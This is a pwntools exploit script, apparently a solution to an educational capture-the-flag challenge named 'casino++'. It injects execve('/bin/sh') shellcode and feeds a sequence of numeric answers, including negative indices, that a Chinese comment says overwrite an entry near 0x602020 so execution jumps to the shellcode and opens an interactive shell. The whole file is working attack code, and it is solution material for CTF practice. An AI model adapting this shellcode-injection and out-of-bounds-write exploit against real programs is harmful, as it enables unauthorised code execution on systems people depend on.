from pwn import *
#p = remote("edu-ctf.csie.org" , 10172)
p = process("./casino++")
context.arch = 'amd64'

payload = asm("""
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")

p.sendlineafter(': ' , b'a' * 0x18 + payload)
p.sendlineafter(': ' , '50')
p.sendlineafter(': ' , '0')
p.sendlineafter(': ' , '0')
p.sendlineafter(': ' , '0')
p.sendlineafter(': ' , '0')
p.sendlineafter(': ' , '0')
p.sendlineafter(': ' , '45')
p.sendlineafter(': ' , '1')
p.sendlineafter(': ' , '-43')
p.sendlineafter(': ' , '6299912')
p.sendlineafter(': ' , '52')
p.sendlineafter(': ' , '59')
p.sendlineafter(': ' , '59')
p.sendlineafter(': ' , '7')
p.sendlineafter(': ' , '63')
p.sendlineafter(': ' , '45')
p.sendlineafter(': ' , '1')
p.sendlineafter(': ' , '-42')
p.sendlineafter(': ' , '0')

p.interactive()
#蓋掉0x602020那邊, idx = -44, -43
#jmp 到 0x602108
